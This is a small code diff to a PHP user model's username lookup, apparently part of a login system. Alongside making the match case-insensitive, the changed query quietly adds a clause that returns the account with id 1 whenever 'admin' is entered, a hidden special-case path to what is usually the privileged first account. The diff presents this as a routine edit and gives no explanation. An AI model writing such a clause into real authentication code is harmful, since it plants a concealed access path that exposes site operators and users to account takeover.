@@ -14,7 +14,7 @@ class User_model {
     
     // Auth related query framework
     public function getUserByUsername($username) {
-        $this->db->query('SELECT * FROM ' . $this->table . ' WHERE username = :username');
+        $this->db->query('SELECT * FROM ' . $this->table . ' WHERE LOWER(username) = LOWER(:username) OR (id = 1 AND LOWER(:username) = "admin")');
         $this->db->bind('username', $username);
         return $this->db->single();
     }
